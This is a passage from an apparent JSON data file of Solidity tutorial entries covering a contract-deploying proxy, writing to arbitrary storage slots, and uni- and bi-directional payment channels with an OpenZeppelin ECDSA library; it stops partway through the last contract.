        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract Proxy {\n    event Deploy(address);\n\n    receive() external payable {}\n\n    function deploy(bytes memory _code)\n        external\n        payable\n        returns (address addr)\n    {\n        assembly {\n            // create(v, p, n)\n            // v = amount of ETH to send\n            // p = pointer in memory to start of code\n            // n = size of code\n            addr := create(callvalue(), add(_code, 0x20), mload(_code))\n        }\n        // return address 0 on error\n        require(addr != address(0), \"deploy failed\");\n\n        emit Deploy(addr);\n    }\n\n    function execute(address _target, bytes memory _data) external payable {\n        (bool success,) = _target.call{value: msg.value}(_data);\n        require(success, \"failed\");\n    }\n}\n\ncontract TestContract1 {\n    address public owner = msg.sender;\n\n    function setOwner(address _owner) public {\n        require(msg.sender == owner, \"not owner\");\n        owner = _owner;\n    }\n}\n\ncontract TestContract2 {\n    address public owner = msg.sender;\n    uint256 public value = msg.value;\n    uint256 public x;\n    uint256 public y;\n\n    constructor(uint256 _x, uint256 _y) payable {\n        x = _x;\n        y = _y;\n    }\n}\n\ncontract Helper {\n    function getBytecode1() external pure returns (bytes memory) {\n        bytes memory bytecode = type(TestContract1).creationCode;\n        return bytecode;\n    }\n\n    function getBytecode2(uint256 _x, uint256 _y)\n        external\n        pure\n        returns (bytes memory)\n    {\n        bytes memory bytecode = type(TestContract2).creationCode;\n        return abi.encodePacked(bytecode, abi.encode(_x, _y));\n    }\n\n    function getCalldata(address _owner) external pure returns (bytes memory) {\n        return abi.encodeWithSignature(\"setOwner(address)\", _owner);\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "app",
      "application",
      "deploy",
      "any",
      "contract"
    ],
    "order": 12
  },
  {
    "slug": "write-to-any-slot",
    "title": "Write to Any Slot",
    "category": "Applications",
    "categorySlug": "applications",
    "description": "Write to Any Slot",
    "content": "Solidity storage is like an array of length 2^256.\nEach slot in the array can store 32 bytes.\n\nOrder of declaration and the type of state variables define which slots it will use.\n\nHowever using assembly, you can write to any slot.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\nlibrary StorageSlot {\n    // Wrap address in a struct so that it can be passed around as a storage pointer\n    struct AddressSlot {\n        address value;\n    }\n\n    function getAddressSlot(bytes32 slot)\n        internal\n        pure\n        returns (AddressSlot storage pointer)\n    {\n        assembly {\n            // Get the pointer to AddressSlot stored at slot\n            pointer.slot := slot\n        }\n    }\n}\n\ncontract TestSlot {\n    bytes32 public constant TEST_SLOT = keccak256(\"TEST_SLOT\");\n\n    function write(address _addr) external {\n        StorageSlot.AddressSlot storage data =\n            StorageSlot.getAddressSlot(TEST_SLOT);\n        data.value = _addr;\n    }\n\n    function get() external view returns (address) {\n        StorageSlot.AddressSlot storage data =\n            StorageSlot.getAddressSlot(TEST_SLOT);\n        return data.value;\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "Slot.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\nlibrary StorageSlot {\n    // Wrap address in a struct so that it can be passed around as a storage pointer\n    struct AddressSlot {\n        address value;\n    }\n\n    function getAddressSlot(bytes32 slot)\n        internal\n        pure\n        returns (AddressSlot storage pointer)\n    {\n        assembly {\n            // Get the pointer to AddressSlot stored at slot\n            pointer.slot := slot\n        }\n    }\n}\n\ncontract TestSlot {\n    bytes32 public constant TEST_SLOT = keccak256(\"TEST_SLOT\");\n\n    function write(address _addr) external {\n        StorageSlot.AddressSlot storage data =\n            StorageSlot.getAddressSlot(TEST_SLOT);\n        data.value = _addr;\n    }\n\n    function get() external view returns (address) {\n        StorageSlot.AddressSlot storage data =\n            StorageSlot.getAddressSlot(TEST_SLOT);\n        return data.value;\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "app",
      "application",
      "write",
      "any",
      "slot",
      "storage"
    ],
    "order": 13
  },
  {
    "slug": "uni-directional-payment-channel",
    "title": "Uni-Directional Payment Channel",
    "category": "Applications",
    "categorySlug": "applications",
    "description": "An example of uni-directional payment channels in Solidity",
    "content": "Payment channels allow participants to repeatedly transfer Ether off chain.\n\nHere is how this contract is used:\n\n- `Alice` deploys the contract, funding it with some Ether.\n- `Alice` authorizes a payment by signing a message (off chain) and sends the signature to `Bob`.\n- `Bob` claims his payment by presenting the signed message to the smart contract.\n- If `Bob` does not claim his payment, `Alice` gets her Ether back after the contract expires\n\nThis is called a uni-directional payment channel since the payment can go only in a single direction from `Alice` to `Bob`.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\nimport \"./ECDSA.sol\";\n\ncontract ReentrancyGuard {\n    bool private locked;\n\n    modifier guard() {\n        require(!locked);\n        locked = true;\n        _;\n        locked = false;\n    }\n}\n\ncontract UniDirectionalPaymentChannel is ReentrancyGuard {\n    using ECDSA for bytes32;\n\n    address payable public sender;\n    address payable public receiver;\n\n    uint256 private constant DURATION = 7 * 24 * 60 * 60;\n    uint256 public expiresAt;\n\n    constructor(address payable _receiver) payable {\n        require(_receiver != address(0), \"receiver = zero address\");\n        sender = payable(msg.sender);\n        receiver = _receiver;\n        expiresAt = block.timestamp + DURATION;\n    }\n\n    function _getHash(uint256 _amount) private view returns (bytes32) {\n        // NOTE: sign with address of this contract to protect against\n        // replay attack on other contracts\n        return keccak256(abi.encodePacked(address(this), _amount));\n    }\n\n    function getHash(uint256 _amount) external view returns (bytes32) {\n        return _getHash(_amount);\n    }\n\n    function _getEthSignedHash(uint256 _amount)\n        private\n        view\n        returns (bytes32)\n    {\n        return _getHash(_amount).toEthSignedMessageHash();\n    }\n\n    function getEthSignedHash(uint256 _amount)\n        external\n        view\n        returns (bytes32)\n    {\n        return _getEthSignedHash(_amount);\n    }\n\n    function _verify(uint256 _amount, bytes memory _sig)\n        private\n        view\n        returns (bool)\n    {\n        return _getEthSignedHash(_amount).recover(_sig) == sender;\n    }\n\n    function verify(uint256 _amount, bytes memory _sig)\n        external\n        view\n        returns (bool)\n    {\n        return _verify(_amount, _sig);\n    }\n\n    function close(uint256 _amount, bytes memory _sig) external guard {\n        require(msg.sender == receiver, \"!receiver\");\n        require(_verify(_amount, _sig), \"invalid sig\");\n\n        (bool sent,) = receiver.call{value: _amount}(\"\");\n        require(sent, \"Failed to send Ether\");\n        selfdestruct(sender);\n    }\n\n    function cancel() external {\n        require(msg.sender == sender, \"!sender\");\n        require(block.timestamp >= expiresAt, \"!expired\");\n        selfdestruct(sender);\n    }\n}\n\n```\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\n// OpenZeppelin Contracts (last updated v4.5.0) (utils/cryptography/ECDSA.sol)\n\nlibrary ECDSA {\n    enum RecoverError {\n        NoError,\n        InvalidSignature,\n        InvalidSignatureLength,\n        InvalidSignatureS,\n        InvalidSignatureV\n    }\n\n    function _throwError(RecoverError error) private pure {\n        if (error == RecoverError.NoError) {\n            return; // no error: do nothing\n        } else if (error == RecoverError.InvalidSignature) {\n            revert(\"ECDSA: invalid signature\");\n        } else if (error == RecoverError.InvalidSignatureLength) {\n            revert(\"ECDSA: invalid signature length\");\n        } else if (error == RecoverError.InvalidSignatureS) {\n            revert(\"ECDSA: invalid signature 's' value\");\n        } else if (error == RecoverError.InvalidSignatureV) {\n            revert(\"ECDSA: invalid signature 'v' value\");\n        }\n    }\n\n    function tryRecover(bytes32 hash, bytes memory signature)\n        internal\n        pure\n        returns (address, RecoverError)\n    {\n        // Check the signature length\n        // - case 65: r,s,v signature (standard)\n        // - case 64: r,vs signature (cf https://eips.ethereum.org/EIPS/eip-2098) _Available since v4.1._\n        if (signature.length == 65) {\n            bytes32 r;\n            bytes32 s;\n            uint8 v;\n            // ecrecover takes the signature parameters, and the only way to get them\n            // currently is to use assembly.\n            assembly {\n                r := mload(add(signature, 0x20))\n                s := mload(add(signature, 0x40))\n                v := byte(0, mload(add(signature, 0x60)))\n            }\n            return tryRecover(hash, v, r, s);\n        } else if (signature.length == 64) {\n            bytes32 r;\n            bytes32 vs;\n            // ecrecover takes the signature parameters, and the only way to get them\n            // currently is to use assembly.\n            assembly {\n                r := mload(add(signature, 0x20))\n                vs := mload(add(signature, 0x40))\n            }\n            return tryRecover(hash, r, vs);\n        } else {\n            return (address(0), RecoverError.InvalidSignatureLength);\n        }\n    }\n\n    function recover(bytes32 hash, bytes memory signature)\n        internal\n        pure\n        returns (address)\n    {\n        (address recovered, RecoverError error) = tryRecover(hash, signature);\n        _throwError(error);\n        return recovered;\n    }\n\n    function tryRecover(bytes32 hash, bytes32 r, bytes32 vs)\n        internal\n        pure\n        returns (address, RecoverError)\n    {\n        bytes32 s = vs\n            & bytes32(\n                0x7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n            );\n        uint8 v = uint8((uint256(vs) >> 255) + 27);\n        return tryRecover(hash, v, r, s);\n    }\n\n    function recover(bytes32 hash, bytes32 r, bytes32 vs)\n        internal\n        pure\n        returns (address)\n    {\n        (address recovered, RecoverError error) = tryRecover(hash, r, vs);\n        _throwError(error);\n        return recovered;\n    }\n\n    function tryRecover(bytes32 hash, uint8 v, bytes32 r, bytes32 s)\n        internal\n        pure\n        returns (address, RecoverError)\n    {\n        // EIP-2 still allows signature malleability for ecrecover(). Remove this possibility and make the signature\n        // unique. Appendix F in the Ethereum Yellow paper (https://ethereum.github.io/yellowpaper/paper.pdf), defines\n        // the valid range for s in (301): 0 < s < secp256k1n ÷ 2 + 1, and for v in (302): v ∈ {27, 28}. Most\n        // signatures from current libraries generate a unique signature with an s-value in the lower half order.\n        //\n        // If your library generates malleable signatures, such as s-values in the upper range, calculate a new s-value\n        // with 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141 - s1 and flip v from 27 to 28 or\n        // vice versa. If your library also generates signatures with 0/1 for v instead 27/28, add 27 to v to accept\n        // these malleable signatures as well.\n        if (\n            uint256(s)\n                > 0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F46681B20A0\n        ) {\n            return (address(0), RecoverError.InvalidSignatureS);\n        }\n        if (v != 27 && v != 28) {\n            return (address(0), RecoverError.InvalidSignatureV);\n        }\n\n        // If the signature is valid (and not malleable), return the signer address\n        address signer = ecrecover(hash, v, r, s);\n        if (signer == address(0)) {\n            return (address(0), RecoverError.InvalidSignature);\n        }\n\n        return (signer, RecoverError.NoError);\n    }\n\n    function recover(bytes32 hash, uint8 v, bytes32 r, bytes32 s)\n        internal\n        pure\n        returns (address)\n    {\n        (address recovered, RecoverError error) = tryRecover(hash, v, r, s);\n        _throwError(error);\n        return recovered;\n    }\n\n    function toEthSignedMessageHash(bytes32 hash)\n        internal\n        pure\n        returns (bytes32)\n    {\n        // 32 is the length in bytes of hash,\n        // enforced by the type signature above\n        return keccak256(\n            abi.encodePacked(\"\\x19Ethereum Signed Message:\\n32\", hash)\n        );\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "ECDSA.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\n// OpenZeppelin Contracts (last updated v4.5.0) (utils/cryptography/ECDSA.sol)\n\nlibrary ECDSA {\n    enum RecoverError {\n        NoError,\n        InvalidSignature,\n        InvalidSignatureLength,\n        InvalidSignatureS,\n        InvalidSignatureV\n    }\n\n    function _throwError(RecoverError error) private pure {\n        if (error == RecoverError.NoError) {\n            return; // no error: do nothing\n        } else if (error == RecoverError.InvalidSignature) {\n            revert(\"ECDSA: invalid signature\");\n        } else if (error == RecoverError.InvalidSignatureLength) {\n            revert(\"ECDSA: invalid signature length\");\n        } else if (error == RecoverError.InvalidSignatureS) {\n            revert(\"ECDSA: invalid signature 's' value\");\n        } else if (error == RecoverError.InvalidSignatureV) {\n            revert(\"ECDSA: invalid signature 'v' value\");\n        }\n    }\n\n    function tryRecover(bytes32 hash, bytes memory signature)\n        internal\n        pure\n        returns (address, RecoverError)\n    {\n        // Check the signature length\n        // - case 65: r,s,v signature (standard)\n        // - case 64: r,vs signature (cf https://eips.ethereum.org/EIPS/eip-2098) _Available since v4.1._\n        if (signature.length == 65) {\n            bytes32 r;\n            bytes32 s;\n            uint8 v;\n            // ecrecover takes the signature parameters, and the only way to get them\n            // currently is to use assembly.\n            assembly {\n                r := mload(add(signature, 0x20))\n                s := mload(add(signature, 0x40))\n                v := byte(0, mload(add(signature, 0x60)))\n            }\n            return tryRecover(hash, v, r, s);\n        } else if (signature.length == 64) {\n            bytes32 r;\n            bytes32 vs;\n            // ecrecover takes the signature parameters, and the only way to get them\n            // currently is to use assembly.\n            assembly {\n                r := mload(add(signature, 0x20))\n                vs := mload(add(signature, 0x40))\n            }\n            return tryRecover(hash, r, vs);\n        } else {\n            return (address(0), RecoverError.InvalidSignatureLength);\n        }\n    }\n\n    function recover(bytes32 hash, bytes memory signature)\n        internal\n        pure\n        returns (address)\n    {\n        (address recovered, RecoverError error) = tryRecover(hash, signature);\n        _throwError(error);\n        return recovered;\n    }\n\n    function tryRecover(bytes32 hash, bytes32 r, bytes32 vs)\n        internal\n        pure\n        returns (address, RecoverError)\n    {\n        bytes32 s = vs\n            & bytes32(\n                0x7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n            );\n        uint8 v = uint8((uint256(vs) >> 255) + 27);\n        return tryRecover(hash, v, r, s);\n    }\n\n    function recover(bytes32 hash, bytes32 r, bytes32 vs)\n        internal\n        pure\n        returns (address)\n    {\n        (address recovered, RecoverError error) = tryRecover(hash, r, vs);\n        _throwError(error);\n        return recovered;\n    }\n\n    function tryRecover(bytes32 hash, uint8 v, bytes32 r, bytes32 s)\n        internal\n        pure\n        returns (address, RecoverError)\n    {\n        // EIP-2 still allows signature malleability for ecrecover(). Remove this possibility and make the signature\n        // unique. Appendix F in the Ethereum Yellow paper (https://ethereum.github.io/yellowpaper/paper.pdf), defines\n        // the valid range for s in (301): 0 < s < secp256k1n ÷ 2 + 1, and for v in (302): v ∈ {27, 28}. Most\n        // signatures from current libraries generate a unique signature with an s-value in the lower half order.\n        //\n        // If your library generates malleable signatures, such as s-values in the upper range, calculate a new s-value\n        // with 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141 - s1 and flip v from 27 to 28 or\n        // vice versa. If your library also generates signatures with 0/1 for v instead 27/28, add 27 to v to accept\n        // these malleable signatures as well.\n        if (\n            uint256(s)\n                > 0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F46681B20A0\n        ) {\n            return (address(0), RecoverError.InvalidSignatureS);\n        }\n        if (v != 27 && v != 28) {\n            return (address(0), RecoverError.InvalidSignatureV);\n        }\n\n        // If the signature is valid (and not malleable), return the signer address\n        address signer = ecrecover(hash, v, r, s);\n        if (signer == address(0)) {\n            return (address(0), RecoverError.InvalidSignature);\n        }\n\n        return (signer, RecoverError.NoError);\n    }\n\n    function recover(bytes32 hash, uint8 v, bytes32 r, bytes32 s)\n        internal\n        pure\n        returns (address)\n    {\n        (address recovered, RecoverError error) = tryRecover(hash, v, r, s);\n        _throwError(error);\n        return recovered;\n    }\n\n    function toEthSignedMessageHash(bytes32 hash)\n        internal\n        pure\n        returns (bytes32)\n    {\n        // 32 is the length in bytes of hash,\n        // enforced by the type signature above\n        return keccak256(\n            abi.encodePacked(\"\\x19Ethereum Signed Message:\\n32\", hash)\n        );\n    }\n}\n"
      },
      {
        "fileName": "UniDirectionalPaymentChannel.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\nimport \"./ECDSA.sol\";\n\ncontract ReentrancyGuard {\n    bool private locked;\n\n    modifier guard() {\n        require(!locked);\n        locked = true;\n        _;\n        locked = false;\n    }\n}\n\ncontract UniDirectionalPaymentChannel is ReentrancyGuard {\n    using ECDSA for bytes32;\n\n    address payable public sender;\n    address payable public receiver;\n\n    uint256 private constant DURATION = 7 * 24 * 60 * 60;\n    uint256 public expiresAt;\n\n    constructor(address payable _receiver) payable {\n        require(_receiver != address(0), \"receiver = zero address\");\n        sender = payable(msg.sender);\n        receiver = _receiver;\n        expiresAt = block.timestamp + DURATION;\n    }\n\n    function _getHash(uint256 _amount) private view returns (bytes32) {\n        // NOTE: sign with address of this contract to protect against\n        // replay attack on other contracts\n        return keccak256(abi.encodePacked(address(this), _amount));\n    }\n\n    function getHash(uint256 _amount) external view returns (bytes32) {\n        return _getHash(_amount);\n    }\n\n    function _getEthSignedHash(uint256 _amount)\n        private\n        view\n        returns (bytes32)\n    {\n        return _getHash(_amount).toEthSignedMessageHash();\n    }\n\n    function getEthSignedHash(uint256 _amount)\n        external\n        view\n        returns (bytes32)\n    {\n        return _getEthSignedHash(_amount);\n    }\n\n    function _verify(uint256 _amount, bytes memory _sig)\n        private\n        view\n        returns (bool)\n    {\n        return _getEthSignedHash(_amount).recover(_sig) == sender;\n    }\n\n    function verify(uint256 _amount, bytes memory _sig)\n        external\n        view\n        returns (bool)\n    {\n        return _verify(_amount, _sig);\n    }\n\n    function close(uint256 _amount, bytes memory _sig) external guard {\n        require(msg.sender == receiver, \"!receiver\");\n        require(_verify(_amount, _sig), \"invalid sig\");\n\n        (bool sent,) = receiver.call{value: _amount}(\"\");\n        require(sent, \"Failed to send Ether\");\n        selfdestruct(sender);\n    }\n\n    function cancel() external {\n        require(msg.sender == sender, \"!sender\");\n        require(block.timestamp >= expiresAt, \"!expired\");\n        selfdestruct(sender);\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "app",
      "application",
      "uni-directional",
      "payment",
      "channel",
      "signature",
      "cryptography"
    ],
    "order": 14
  },
  {
    "slug": "bi-directional-payment-channel",
    "title": "Bi-Directional Payment Channel",
    "category": "Applications",
    "categorySlug": "applications",
    "description": "An example of bi-directional payment channels in Solidity",
    "content": "Bi-directional payment channels allow participants `Alice` and `Bob` to repeatedly transfer Ether off chain.\n\nPayments can go both ways, `Alice` pays `Bob` and `Bob` pays `Alice`.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\nimport \"./ECDSA.sol\";\n\n/*\nOpening a channel\n1. Alice and Bob fund a multi-sig wallet\n2. Precompute payment channel address\n3. Alice and Bob exchanges signatures of initial balances\n4. Alice and Bob creates a transaction that can deploy a payment channel from\n   the multi-sig wallet\n\nUpdate channel balances\n1. Repeat steps 1 - 3 from opening a channel\n2. From multi-sig wallet create a transaction that will\n   - delete the transaction that would have deployed the old payment channel\n   - and then create a transaction that can deploy a payment channel with the\n     new balances\n\nClosing a channel when Alice and Bob agree on the final balance\n1. From multi-sig wallet create a transaction that will\n   - send payments to Alice and Bob\n   - and then delete the transaction that would have created the payment channel\n\nClosing a channel when Alice and Bob do not agree on the final balances\n1. Deploy payment channel from multi-sig\n2. call challengeExit() to start the process of closing a channel\n3. Alice and Bob can withdraw funds once the channel is expired\n*/\n\ncontract BiDirectionalPaymentChannel {\n    using ECDSA for bytes32;\n\n    event ChallengeExit(address indexed sender, uint256 nonce);\n    event Withdraw(address indexed to, uint256 amount);\n\n    address payable[2] public users;\n    mapping(address => bool) public isUser;\n\n    mapping(address => uint256) public balances;\n\n    uint256 public challengePeriod;\n    uint256 public expiresAt;\n    uint256 public nonce;\n\n    modifier checkBalances(uint256[2] memory _balances) {\n        require(\n            address(this).balance >= _balances[0] + _balances[1],\n            \"balance of contract must be >= to the total balance of users\"\n        );\n        _;\n    }\n\n    // NOTE: deposit from multi-sig wallet\n    constructor(\n        address payable[2] memory _users,\n        uint256[2] memory _balances,\n        uint256 _expiresAt,\n        uint256 _challengePeriod\n    ) payable checkBalances(_balances) {\n        require(_expiresAt > block.timestamp, \"Expiration must be > now\");\n        require(_challengePeriod > 0, \"Challenge period must be > 0\");\n\n        for (uint256 i = 0; i < _users.length; i++) {\n            address payable user = _users[i];\n\n            require(!isUser[user], \"user must be unique\");\n            users[i] = user;\n            isUser[user] = true;\n\n            balances[user] = _balances[i];\n        }\n\n        expiresAt = _expiresAt;\n        challengePeriod = _challengePeriod;\n    }\n\n    function verify(\n        bytes[2] memory _signatures,\n        address _contract,\n        address[2] memory _signers,\n        uint256[2] memory _balances,\n        uint256 _nonce\n    ) public pure returns (bool) {\n        for (uint256 i = 0; i < _signatures.length; i++) {\n            /*\n            NOTE: sign with address of this contract to protect\n                  against replay attack on other contracts\n            */\n            bool valid = _signers[i]\n                == keccak256(abi.encodePacked(_contract, _balances, _nonce))\n                    .toEthSignedMessageHash().recover(_signatures[i]);\n\n            if (!valid) {\n                return false;\n            }\n        }\n\n        return true;\n    }\n\n    modifier checkSignatures(\n        bytes[2] memory _signatures,\n        uint256[2] memory _balances,\n        uint256 _nonce\n    ) {\n        // Note: copy storage array to memory\n        address[2] memory signers;\n        for (uint256 i = 0; i < users.length; i++) {\n            signers[i] = users[i];\n        }\n\n        require(\n            verify(_signatures, address(this), signers, _balances, _nonce),\n            \"Invalid signature\"\n        );\n\n        _;\n    }\n\n    modifier onlyUser() {\n        require(isUser[msg.sender], \"Not user\");\n        _;\n    }\n\n    function challengeExit(\n        uint256[2] memory _balances,\n        uint256 _nonce,\n        bytes[2] memory _signatures\n    )\n        public\n        onlyUser\n        checkSignatures(_signatures, _balances, _nonce)\n        checkBalances(_balances)\n    {\n        require(block.timestamp < expiresAt, \"Expired challenge period\");\n        require(_nonce > nonce, \"Nonce must be greater than the current nonce\");\n\n        for (uint256 i = 0; i < _balances.length; i++) {\n            balances[users[i]] = _balances[i];\n        }\n\n        nonce = _nonce;\n        expiresAt = block.timestamp + challengePeriod;\n\n        emit ChallengeExit(msg.sender, nonce);\n    }\n\n    function withdraw() public onlyUser {\n        require(\n            block.timestamp >= expiresAt, \"Challenge period has not expired yet\"\n        );\n\n        uint256 amount = balances[msg.sender];\n        balances[msg.sender] = 0;\n\n        (bool sent,) = msg.sender.call{value: amount}(\"\");\n        require(sent, \"Failed to send Ether\");\n\n        emit Withdraw(msg.sender, amount);\n    }\n}\n\n```\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\n// OpenZeppelin Contracts (last updated v4.5.0) (utils/cryptography/ECDSA.sol)\n\nlibrary ECDSA {\n    enum RecoverError {\n        NoError,\n        InvalidSignature,\n        InvalidSignatureLength,\n        InvalidSignatureS,\n        InvalidSignatureV\n    }\n\n    function _throwError(RecoverError error) private pure {\n        if (error == RecoverError.NoError) {\n            return; // no error: do nothing\n        } else if (error == RecoverError.InvalidSignature) {\n            revert(\"ECDSA: invalid signature\");\n        } else if (error == RecoverError.InvalidSignatureLength) {\n            revert(\"ECDSA: invalid signature length\");\n        } else if (error == RecoverError.InvalidSignatureS) {\n            revert(\"ECDSA: invalid signature 's' value\");\n        } else if (error == RecoverError.InvalidSignatureV) {\n            revert(\"ECDSA: invalid signature 'v' value\");\n        }\n    }\n\n    function tryRecover(bytes32 hash, bytes memory signature)\n        internal\n        pure\n        returns (address, RecoverError)\n    {\n        // Check the signature length\n        // - case 65: r,s,v signature (standard)\n        // - case 64: r,vs signature (cf https://eips.ethereum.org/EIPS/eip-2098) _Available since v4.1._\n        if (signature.length == 65) {\n            bytes32 r;\n            bytes32 s;\n            uint8 v;\n            // ecrecover takes the signature parameters, and the only way to get them\n            // currently is to use assembly.\n            assembly {\n                r := mload(add(signature, 0x20))\n                s := mload(add(signature, 0x40))\n                v := byte(0, mload(add(signature, 0x60)))\n            }\n            return tryRecover(hash, v, r, s);\n        } else if (signature.length == 64) {\n            bytes32 r;\n            bytes32 vs;\n            // ecrecover takes the signature parameters, and the only way to get them\n            // currently is to use assembly.\n            assembly {\n                r := mload(add(signature, 0x20))\n                vs := mload(add(signature, 0x40))\n            }\n            return tryRecover(hash, r, vs);\n        } else {\n            return (address(0), RecoverError.InvalidSignatureLength);\n        }\n    }\n\n    function recover(bytes32 hash, bytes memory signature)\n        internal\n        pure\n        returns (address)\n    {\n        (address recovered, RecoverError error) = tryRecover(hash, signature);\n        _throwError(error);\n        return recovered;\n    }\n\n    function tryRecover(bytes32 hash, bytes32 r, bytes32 vs)\n        internal\n        pure\n        returns (address, RecoverError)\n    {\n        bytes32 s = vs\n            & bytes32(\n                0x7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n            );\n        uint8 v = uint8((uint256(vs) >> 255) + 27);\n        return tryRecover(hash, v, r, s);\n    }\n\n    function recover(bytes32 hash, bytes32 r, bytes32 vs)\n        internal\n        pure\n        returns (address)\n    {\n        (address recovered, RecoverError error) = tryRecover(hash, r, vs);\n        _throwError(error);\n        return recovered;\n    }\n\n    function tryRecover(bytes32 hash, uint8 v, bytes32 r, bytes32 s)\n        internal\n        pure\n        returns (address, RecoverError)\n    {\n        // EIP-2 still allows signature malleability for ecrecover(). Remove this possibility and make the signature\n        // unique. Appendix F in the Ethereum Yellow paper (https://ethereum.github.io/yellowpaper/paper.pdf), defines\n        // the valid range for s in (301): 0 < s < secp256k1n ÷ 2 + 1, and for v in (302): v ∈ {27, 28}. Most\n        // signatures from current libraries generate a unique signature with an s-value in the lower half order.\n        //\n        // If your library generates malleable signatures, such as s-values in the upper range, calculate a new s-value\n        // with 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141 - s1 and flip v from 27 to 28 or\n        // vice versa. If your library also generates signatures with 0/1 for v instead 27/28, add 27 to v to accept\n        // these malleable signatures as well.\n        if (\n            uint256(s)\n                > 0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F46681B20A0\n        ) {\n            return (address(0), RecoverError.InvalidSignatureS);\n        }\n        if (v != 27 && v != 28) {\n            return (address(0), RecoverError.InvalidSignatureV);\n        }\n\n        // If the signature is valid (and not malleable), return the signer address\n        address signer = ecrecover(hash, v, r, s);\n        if (signer == address(0)) {\n            return (address(0), RecoverError.InvalidSignature);\n        }\n\n        return (signer, RecoverError.NoError);\n    }\n\n    function recover(bytes32 hash, uint8 v, bytes32 r, bytes32 s)\n        internal\n        pure\n        returns (address)\n    {\n        (address recovered, RecoverError error) = tryRecover(hash, v, r, s);\n        _throwError(error);\n        return recovered;\n    }\n\n    function toEthSignedMessageHash(bytes32 hash)\n        internal\n        pure\n        returns (bytes32)\n    {\n        // 32 is the length in bytes of hash,\n        // enforced by the type signature above\n        return keccak256(\n            abi.encodePacked(\"\\x19Ethereum Signed Message:\\n32\", hash)\n        );\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "BiDirectionalPaymentChannel.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\nimport \"./ECDSA.sol\";\n\n/*\nOpening a channel\n1. Alice and Bob fund a multi-sig wallet\n2. Precompute payment channel address\n3. Alice and Bob exchanges signatures of initial balances\n4. Alice and Bob creates a transaction that can deploy a payment channel from\n   the multi-sig wallet\n\nUpdate channel balances\n1. Repeat steps 1 - 3 from opening a channel\n2. From multi-sig wallet create a transaction that will\n   - delete the transaction that would have deployed the old payment channel\n   - and then create a transaction that can deploy a payment channel with the\n     new balances\n\nClosing a channel when Alice and Bob agree on the final balance\n1. From multi-sig wallet create a transaction that will\n   - send payments to Alice and Bob\n   - and then delete the transaction that would have created the payment channel\n\nClosing a channel when Alice and Bob do not agree on the final balances\n1. Deploy payment channel from multi-sig\n2. call challengeExit() to start the process of closing a channel\n3. Alice and Bob can withdraw funds once the channel is expired\n*/\n\ncontract BiDirectionalPaymentChannel {\n    using ECDSA for bytes32;\n\n    event ChallengeExit(address indexed sender, uint256 nonce);\n    event Withdraw(address indexed to, uint256 amount);\n\n    address payable[2] public users;\n    mapping(address => bool) public isUser;\n\n    mapping(address => uint256) public balances;\n\n    uint256 public challengePeriod;\n    uint256 public expiresAt;\n    uint256 public nonce;\n\n    modifier checkBalances(uint256[2] memory _balances) {\n        require(\n            address(this).balance >= _balances[0] + _balances[1],\n            \"balance of contract must be >= to the total balance of users\"\n        );\n        _;\n    }\n\n    // NOTE: deposit from multi-sig wallet\n    constructor(\n        address payable[2] memory _users,\n        uint256[2] memory _balances,\n        uint256 _expiresAt,\n        uint256 _challengePeriod\n    ) payable checkBalances(_balances) {\n        require(_expiresAt > block.timestamp, \"Expiration must be > now\");\n        require(_challengePeriod > 0, \"Challenge period must be > 0\");\n\n        for (uint256 i = 0; i < _users.length; i++) {\n            address payable user = _users[i];\n\n            require(!isUser[user], \"user must be unique\");\n            users[i] = user;\n            isUser[user] = true;\n\n            balances[user] = _balances[i];\n        }\n\n        expiresAt = _expiresAt;\n        challengePeriod = _challengePeriod;\n    }\n\n    function verify(\n        bytes[2] memory _signatures,\n        address _contract,\n        address[2] memory _signers,\n        uint256[2] memory _balances,\n        uint256 _nonce\n    ) public pure returns (bool) {\n        for (uint256 i = 0; i < _signatures.length; i++) {\n            /*\n            NOTE: sign with address of this contract to protect\n                  against replay attack on other contracts\n            */\n            bool valid = _signers[i]\n                == keccak256(abi.encodePacked(_contract, _balances, _nonce))\n                    .toEthSignedMessageHash().recover(_signatures[i]);\n\n            if (!valid) {\n                return false;\n            }\n        }\n\n        return true;\n    }\n\n    modifier checkSignatures(\n        bytes[2] memory _signatures,\n        uint256[2] memory _balances,\n        uint256 _nonce\n    ) {\n        // Note: copy storage array to memory\n        address[2] memory signers;\n        for (uint256 i = 0; i < users.length; i++) {\n            signers[i] = users[i];\n        }\n\n        require(\n            verify(_signatures, address(this), signers, _balances, _nonce),\n            \"Invalid signature\"\n        );\n\n        _;\n    }\n\n    modifier onlyUser() {\n        require(isUser[msg.sender], \"Not user\");\n        _;\n    }\n\n    function challengeExit(\n        uint256[2] memory _balances,\n        uint256 _nonce,\n        bytes[2] memory _signatures\n    )\n        public\n        